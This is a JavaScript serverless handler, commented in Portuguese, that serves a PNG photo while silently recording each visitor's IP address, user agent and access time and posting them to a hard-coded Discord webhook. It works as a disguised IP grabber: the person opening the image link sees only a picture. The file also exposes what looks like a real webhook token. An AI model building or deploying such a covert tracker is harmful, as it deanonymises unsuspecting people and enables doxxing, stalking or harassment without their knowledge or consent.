import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  // 1. CAPTURA O IP
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 'IP não detectado';
  const userAgent = req.headers['user-agent'] || 'N/A';
  const agora = new Date();
  
  console.log('📸 Foto acessada! IP:', ip);
  
  // 2. ENVIA PARA DISCORD (CORRIGIDO)
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1455977764501983316/U7XD9SM7LTMxccHyeLQud41lpenMRxd3hr9URi5_vxlIi58JouW5RFkQ5A7QAce_XdeA';
  
  if (DISCORD_WEBHOOK.includes('discord.com')) {
    try {
      await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          // CONTEÚDO VISÍVEL NO DISCORD
          content: `🌐 **Novo acesso à foto!**\n📸 IP: \`${ip}\`\n🕐 ${agora.toLocaleString('pt-BR')}`,
          
          // Embed opcional (mais bonito)
          embeds: [
            {
              title: "📸 Imagem PNG Acessada",
              color: 0x00ff00,
              fields: [
                {
                  name: "🌐 IP Público",
                  value: `\`\`\`${ip}\`\`\``,
                  inline: true
                },
                {
                  name: "📅 Data/Hora",
                  value: `<t:${Math.floor(agora.getTime() / 1000)}:F>`,
                  inline: true
                },
                {
                  name: "🔗 User Agent",
                  value: `\`\`\`${userAgent.substring(0, 100)}\`\`\``,
                  inline: false
                }
              ],
              timestamp: agora.toISOString()
            }
          ]
        })
      });
      console.log('✅ Mensagem enviada para Discord');
    } catch (err) {
      console.log('❌ Erro Discord:', err.message);
    }
  }
  
  // 3. ENVIA SUA FOTO
  try {
    const fotoPath = path.join(process.cwd(), 'public', 'minha-foto.png');
    const fotoBuffer = fs.readFileSync(fotoPath);
    
    res.setHeader('Content-Type', 'image/png');
    res.send(fotoBuffer);
    
  } catch (error) {
    console.log('❌ Erro na foto:', error.message);
    
    // Pixel vermelho se erro
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      'base64'
    );
    
    res.setHeader('Content-Type', 'image/png');
    res.send(pixel);
  }
}
